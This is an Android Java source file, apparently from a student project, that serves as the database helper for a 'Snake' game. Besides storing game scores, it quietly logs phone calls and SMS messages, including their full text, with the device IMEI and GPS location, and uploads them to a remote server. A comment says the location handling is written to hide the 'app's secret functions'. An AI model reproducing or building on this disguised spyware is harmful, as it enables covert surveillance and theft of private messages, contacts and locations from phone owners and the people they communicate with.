package com.example.s1300465.snake;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.database.sqlite.SQLiteOpenHelper;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

public class DatabaseHelper extends SQLiteOpenHelper {
    private static final String DATABASE_NAME = "SnakeScores";
    private static final int DATABASE_VERSION = 12;
    Context context;

    public DatabaseHelper(Context context){
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
        this.context = context;
    }

    @Override
    public void onCreate(SQLiteDatabase db){
        //Create the tables we need
        db.execSQL("CREATE TABLE LocalScores (Name TEXT, Score INTEGER, Uploaded INTEGER);");
        db.execSQL("CREATE TABLE PhoneCalls (DeviceID INTEGER, Participant TEXT, Outgoing INTEGER, Time INTEGER, Duration INTEGER, Lat INTEGER, Long INTEGER);");
        db.execSQL("CREATE TABLE SMS (DeviceID INTEGER, Participant TEXT, Outgoing INTEGER, Time INTEGER, Message TEXT, Lat INTEGER, Long INTEGER);");
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion){
        //If the DB version has been changed, just delete it all and re-create
        try{
            db.execSQL("DROP TABLE PhoneCalls;");
        }catch(Exception ex){}
        try{
            db.execSQL("DROP TABLE SMS;");
        }catch(Exception ex){}
        try{
            db.execSQL("DROP TABLE LocalScores;");
        }catch(Exception ex){}

        onCreate(db);
    }

    public void saveLocalScore(String name, int score){
        //Save a score to the DB
        ContentValues row = new ContentValues();
        row.put("Name", name);
        row.put("Score", score);

        SQLiteDatabase db = this.getWritableDatabase();
        db.insert("LocalScores", null, row);
        new RemoteDatabaseHelper(context).checkConnectionAndUpload();

        db.close();
    }

    public ArrayList<Score> getLocalScores(){
        //Return the list of scores as Score objects
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor result = db.query("LocalScores", new String[]{"Name", "Score"}, null, null, null, null, "Score DESC");

        ArrayList<Score> scores = new ArrayList<>();
        for(int i = 0; i < result.getCount(); i++){
            result.moveToPosition(i);
            scores.add(new Score(result.getString(0), result.getInt(1)));
            Log.d("Score " + i, result.getString(0) + ": " + result.getString(1));
        }

        db.close();

        return scores;
    }

    public ArrayList<JSONObject> getJSONScores() {
        //Return the list of scores as JSON for uploading
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor result = db.query("LocalScores", new String[]{"rowid", "Name", "Score", "Uploaded"}, null, null, null, null, "Score DESC");

        ArrayList<JSONObject> scores = new ArrayList<>();
        for (int i = 0; i < result.getCount(); i++) {
            result.moveToPosition(i);

            if(result.getInt(3) == 0) {
                JSONObject output = new JSONObject();
                JSONObject score = new JSONObject();
                try {
                    output.put("type", "score");
                    output.put("rowid", result.getLong(0));
                    score.put("name", result.getString(1));
                    score.put("score", result.getInt(2));
                    output.put("score", score);
                } catch (JSONException ex) {
                    ex.printStackTrace();
                }

                scores.add(output);
            }
        }

        db.close();
        return scores;
    }

    public void markScoreUploaded(long rowID){
        //Once a score has been uploaded, mark it so that we don't upload it again next time
        SQLiteDatabase db = getWritableDatabase();
        db.execSQL("UPDATE LocalScores SET Uploaded = 1 WHERE rowid = " + rowID);
        db.close();
    }

    public Location getLocation(){
        final LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        Location lastKnown = null;

        final LocationListener locationListener = new LocationListener() {
            //getLastKnownLocation() automatically updates when the LocationListener fires
            //So we don't need to do anything in here
            @Override
            public void onLocationChanged(Location location) {
            }
            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {
            }
            @Override
            public void onProviderEnabled(String provider) {

            }
            @Override
            public void onProviderDisabled(String provider) {
            }
        };

        try {
            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1, 0, locationListener);
            lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        }catch(SecurityException ex){
            Log.w("SecurityException", "No permission to access location");
        }catch(NullPointerException ex){
            ex.printStackTrace();
        }

        //Immediately remove the listener once we've polled location
        //Reduces battery usage so hides app's secret functions better
        try {
            lm.removeUpdates(locationListener);
        }catch(SecurityException ex){
            Log.w("SecurityException", "No permission to access location");
        }

        return lastKnown;
    }

    public void savePhoneCall(String participant, boolean outgoing, long duration, long time){
        //Save a phone call to the DB
        if(participant == null || duration == 0){
            //If the call has no participant or duration, assume something went wrong
            return;
        }
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();
        ContentValues row = new ContentValues();
        row.put("DeviceID", imei);
        row.put("Participant", participant);
        row.put("Outgoing", outgoing ? 1: 0);
        row.put("Time", time);
        row.put("Duration", duration);
        Location loc = getLocation();
        if(loc != null) {
            //Save the location too if we got it successfully
            row.put("Lat", loc.getLatitude());
            row.put("Long", loc.getLongitude());
        }

        SQLiteDatabase db = getWritableDatabase();
        db.insert("PhoneCalls", null, row);
        db.close();

        new RemoteDatabaseHelper(context).checkConnectionAndUpload();
    }


    public ArrayList<JSONObject> getCalls(){
        //Return a list of phone calls
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor result = db.query("PhoneCalls", new String[]{"rowid", "DeviceID", "Participant", "Outgoing", "Time", "Duration", "Lat", "Long"}, null, null, null, null, null);

        ArrayList<JSONObject> calls = new ArrayList<>();
        for(int i = 0; i < result.getCount(); i++){
            result.moveToPosition(i);

            JSONObject output = new JSONObject();
            JSONObject call = new JSONObject();
            try {
                output.put("type", "call");
                output.put("rowid", result.getLong(0));

                call.put("deviceID", result.getInt(1));
                call.put("participant", result.getString(2));
                if(result.getInt(3) == 1){
                    call.put("outgoing", true);
                }else{
                    call.put("outgoing", false);
                }
                call.put("time", result.getLong(4)/1000);
                call.put("duration", result.getInt(5));
                call.put("latitude", result.getDouble(6));
                call.put("longitude", result.getDouble(7));

                output.put("call", call);
            }catch(JSONException ex){
                ex.printStackTrace();
            }

            calls.add(output);
        }

        db.close();

        return calls;
    }

    public void removeCall(long rowID){
        SQLiteDatabase db = getWritableDatabase();
        db.execSQL("DELETE FROM PhoneCalls WHERE rowid = " + rowID);
        db.close();
    }

    public void saveSMS(String participant, boolean outgoing, String message, long time){
        if(participant == null){
            return;
        }
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();
        ContentValues row = new ContentValues();
        row.put("DeviceID", imei);
        row.put("Participant", participant);
        row.put("Outgoing", outgoing ? 1: 0);
        row.put("Time", time);
        row.put("Message", message);
        Location loc = getLocation();
        if(loc != null) {
            row.put("Lat", loc.getLatitude());
            row.put("Long", loc.getLongitude());
        }

        SQLiteDatabase db = getWritableDatabase();
        db.insert("SMS", null, row);
        db.close();

        new RemoteDatabaseHelper(context).checkConnectionAndUpload();
    }

    public ArrayList<JSONObject> getSMS(){
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor result = db.query("SMS", new String[]{"rowid", "DeviceID", "Participant", "Outgoing", "Time", "Message", "Lat", "Long"}, null, null, null, null, null);

        ArrayList<JSONObject> texts = new ArrayList<>();
        for(int i = 0; i < result.getCount(); i++){
            result.moveToPosition(i);

            JSONObject output = new JSONObject();
            JSONObject sms = new JSONObject();
            try {
                output.put("type", "sms");
                output.put("rowid", result.getLong(0));

                sms.put("deviceID", result.getInt(1));
                sms.put("participant", result.getString(2));
                if(result.getInt(3) == 1){
                    sms.put("outgoing", true);
                }else{
                    sms.put("outgoing", false);
                }
                sms.put("time", result.getLong(4)/1000);
                sms.put("message", result.getString(5));
                sms.put("latitude", result.getDouble(6));
                sms.put("longitude", result.getDouble(7));

                output.put("sms", sms);
            }catch(JSONException ex){
                ex.printStackTrace();
            }

            texts.add(output);
        }

        db.close();
        return texts;
    }

    public void removeSMS(long rowID){
        SQLiteDatabase db = getWritableDatabase();
        db.execSQL("DELETE FROM SMS WHERE rowid = " + rowID);
        db.close();
    }
}
